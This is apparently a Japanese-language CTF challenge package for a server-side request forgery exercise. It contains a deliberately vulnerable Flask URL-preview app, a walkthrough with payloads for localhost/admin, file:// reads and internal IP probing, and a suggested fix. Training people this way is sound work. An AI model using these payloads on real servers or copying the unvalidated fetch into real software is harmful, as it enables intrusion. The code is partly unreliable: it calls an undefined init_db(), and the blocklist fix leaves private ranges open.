# URL Preview Service: SSRF (Server-Side Request Forgery)

## シナリオ

あなたは、Biotechnica Labs のペネトレーションテストチームとして、URLプレビュー機能のセキュリティ検証を実施している。

**ターゲット**: URLプレビュー生成サービス  
**目的**: SSRF脆弱性を利用し、内部リソースにアクセスせよ  
**インテル**: このサービスはユーザーが指定したURLのコンテンツを取得し、プレビューを生成する。しかし、内部ネットワークへのアクセス制限が不十分であるとの報告がある。特に、`localhost`の管理者エンドポイント（`/admin`）や、ファイルシステム（`file://`）へのアクセスが可能かもしれない。あなたの任務は、SSRFを利用してサーバー内部の機密フラグを入手することだ。

**ミッション**: SSRF攻撃により、内部リソースにアクセスしてフラグを取得せよ。

---

## 技術的背景: SSRF（Server-Side Request Forgery）とは

### 概要

**SSRF** は、Webアプリケーションがユーザーの指定したURLに対してサーバー側からHTTPリクエストを送信する機能において、適切な検証を行わないことで発生する脆弱性です。

### 仕組み

```
通常の使用:
  ユーザー → "https://example.com" を指定
  サーバー → example.com にリクエスト
  サーバー → 結果をユーザーに返す

SSRF攻撃:
  ユーザー → "http://localhost/admin" を指定
  サーバー → 自分自身の /admin にリクエスト
  サーバー → 内部情報をユーザーに返してしまう
```

### 攻撃対象

1. **localhost (127.0.0.1)**: サーバー自身
2. **内部IP (192.168.x.x)**: 内部ネットワーク
3. **file:// スキーム**: ローカルファイル
4. **クラウドメタデータ**: AWS/GCP等のメタデータエンドポイント

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **HTTPクライアント**: requests
- **ポート**: 8000

### 脆弱なコード実装

```python
from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <title>SSRF - URLプレビュー</title>
            <style>
                body {
                    background: #0a0a0a;
                    color: #00ffaa;
                    font-family: monospace;
                    padding: 20px;
                }
                .container {
                    max-width: 900px;
                    margin: 0 auto;
                    border: 2px solid #00ffaa;
                    padding: 20px;
                    border-radius: 10px;
                }
                input[type="text"] {
                    width: 500px;
                    background: #1a1a1a;
                    color: #00ffaa;
                    border: 1px solid #00ffaa;
                    padding: 8px;
                    font-family: monospace;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>BIOTECHNICA LABS</h1>
                <h2>URL Preview Service</h2>
                <h3>[BETA VERSION]</h3>
                <hr>
                <form method="post" action="/preview">
                    <label>URL to preview:</label><br>
                    <input type="text" name="url" placeholder="https://example.com" value="https://example.com"><br><br>
                    <input type="submit" value="Generate Preview">
                </form>
            </div>
        </body>
        </html>
    ''')

@app.route('/preview', methods=['POST'])
def preview():
    url = request.form['url']
    
    try:
        # ❌ 脆弱性: URLの検証なし
        response = requests.get(url, timeout=5)
        content = response.text[:1000]  # 最初の1000文字
        
        return render_template_string('''
            <h1>Preview Result</h1>
            <p><b>URL:</b> {{ url }}</p>
            <p><b>Status Code:</b> {{ status }}</p>
            <hr>
            <pre style="background:#000;color:#0f0;padding:10px;">{{ content }}</pre>
            <a href="/">戻る</a>
        ''', url=url, status=response.status_code, content=content)
        
    except Exception as e:
        return f'<p>Error: {str(e)}</p><a href="/">戻る</a>'

@app.route('/admin')
def admin():
    # 管理者専用エンドポイント（外部からはアクセス不可の想定）
    flag = os.environ.get('FLAG', 'SolCTF{ssrf_biotechnica_internal}')
    
    return render_template_string('''
        <h1>Admin Panel (Internal Only)</h1>
        <p style="color:red;">このページは内部ネットワークからのみアクセス可能です。</p>
        <hr>
        <p><b>System Flag:</b> <code>{{ flag }}</code></p>
    ''', flag=flag)

if __name__ == '__main__':
    init_db()
    app.run(debug=False, host='0.0.0.0', port=8000)
```

---

## 攻略手順

### ステップ1: 偵察

1. `http://{{CONTAINER_HOST}}/` にアクセス
2. URLプレビュー機能を確認
3. 試しに `https://example.com` を入力

### ステップ2: 内部アクセスを試す

**ペイロード1: localhost**

入力: `http://localhost:8000/`  
結果: トップページのHTMLが表示される

→ **SSRF成功！**

### ステップ3: 管理者エンドポイントにアクセス

**ペイロード2: /admin**

入力: `http://localhost:8000/admin`  
または: `http://127.0.0.1:8000/admin`

**結果**: 管理者ページのHTMLが表示され、フラグが含まれる

```html
<code>SolCTF{ssrf_biotechnica_internal}</code>
```

---

## 応用攻撃

### file:// スキームでファイル読み取り

```
file:///home/ctfuser/flag.txt
```

### 内部IPスキャン

```
http://172.17.0.1:8000/admin
http://192.168.1.1/
```

---

## 難易度

```json
{
  "difficulty": 3,
  "difficulty_factors": {
    "tech": 3,
    "read": 2,
    "explore": 3
  }
}
```

---

## Story Hook

```
Biotechnica Labs のURLプレビューサービスがセキュリティレビューの対象となった。このサービスは外部URLのコンテンツを取得し、プレビューを生成する機能を持つが、内部ネットワークへのアクセス制限が不十分であるとの報告がある。あなたの任務は、SSRF攻撃によりサーバー内部の管理者エンドポイントにアクセスし、そこに保存された機密フラグを入手することだ。
```

## タグ

- Web
- SSRF
- Internal Access
- Intermediate
- Network

## 対策

```python
# ✅ セキュアな実装
from urllib.parse import urlparse

url = request.form['url']
parsed = urlparse(url)

# ホワイトリスト
if parsed.scheme not in ['http', 'https']:
    return "Error: Only HTTP/HTTPS allowed"

# ブラックリスト
if parsed.hostname in ['localhost', '127.0.0.1', '0.0.0.0']:
    return "Error: Internal access denied"

if parsed.hostname.startswith('192.168.') or parsed.hostname.startswith('10.'):
    return "Error: Private IP access denied"
```

